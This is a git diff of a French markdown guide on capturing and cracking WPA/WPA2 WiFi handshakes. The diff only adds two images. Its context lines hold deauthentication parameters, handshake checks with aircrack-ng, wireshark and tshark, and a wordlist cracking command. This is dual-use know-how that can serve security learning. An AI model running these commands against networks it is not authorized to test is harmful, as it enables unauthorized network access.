@@ -74,6 +74,7 @@
         -c [CLIENT_MAC] : L'adresse MAC du client (appareil à déconnecter).
         "INTERFACE" : L'interface WiFi en mode monitor. 
         Important : L'appareil ciblé devrait se déconnecter et tenter une reconnexion automatiquement, ce qui générera une handshake WPA/WPA2.
+![alfa 6](https://github.com/user-attachments/assets/bd986815-e0e7-4cf1-9481-3244edf4bff4)
 
 - Vérifier si il y a bien un handshake 
     - `sudo aircrack-ng file.cap` (1 handshake)
@@ -82,6 +83,7 @@
     - `sudo wireshark -r file.cap` et chercher des fichier oapol
     - `sudo tshark -r file.cap -Y "eapol && wlan.addr==CLIENT"`
 
+![alfa 7](https://github.com/user-attachments/assets/52196726-9a8c-4e04-8fdf-37b93550ea9a)
 
 
 - `sudo aircrack-ng -w [wordlist.txt] -b [BSSID] capture-01.cap`
